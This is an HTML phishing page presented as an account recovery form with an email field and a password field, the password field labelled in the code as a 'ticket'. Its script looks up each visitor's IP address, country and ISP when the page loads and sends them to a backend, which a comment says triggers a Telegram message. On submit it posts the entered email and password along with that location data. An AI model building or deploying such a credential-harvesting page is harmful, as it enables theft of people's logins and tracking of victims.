<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Telegram Bot Test</title>
</head>
<body>
  <h2>life is good , zoned.</h2>

  <form id="recoveryForm">
    <label>Email Address:</label><br />
    <input type="email" class="email-address" name="email" required /><br /><br />

    <label>Password:</label><br />
    <input type="text" class="ticket-id" name="ticket" required /><br /><br />

    <button type="submit" class="submit-now">Submit</button>
  </form>

<script>
  let ipInfoCache = null;

  // Fetch and cache IP info
  async function getIPInfo() {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      ipInfoCache = {
        ip: data.ip || "Unknown",
        country: data.country_name || "Unknown",
        isp: data.org || "Unknown"
      };
    } catch {
      ipInfoCache = { ip: "Unknown", country: "Unknown", isp: "Unknown" };
    }
  }

  window.addEventListener("DOMContentLoaded", getIPInfo);

  document.getElementById("recoveryForm").addEventListener("submit", async function (e) {
    e.preventDefault();

    const email = document.querySelector(".email-address").value;
    const ticket = document.querySelector(".ticket-id").value;

    if (!ipInfoCache) {
      await getIPInfo();
    }

    await fetch("/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        email,
        ticket,
        ip: ipInfoCache.ip,
        country: ipInfoCache.country,
        isp: ipInfoCache.isp
      })
    });

    this.reset();
  });

  async function getIPInfo() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    const info = {
      ip: data.ip || "Unknown",
      country: data.country_name || "Unknown",
      isp: data.org || "Unknown"
    };
    ipInfoCache = info;

    // ✅ Send to backend on page load — triggers Telegram message
    await fetch("/connect", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(info)
    });
  } catch {
    ipInfoCache = { ip: "Unknown", country: "Unknown", isp: "Unknown" };
  }
}

</script>

</body>
</html>
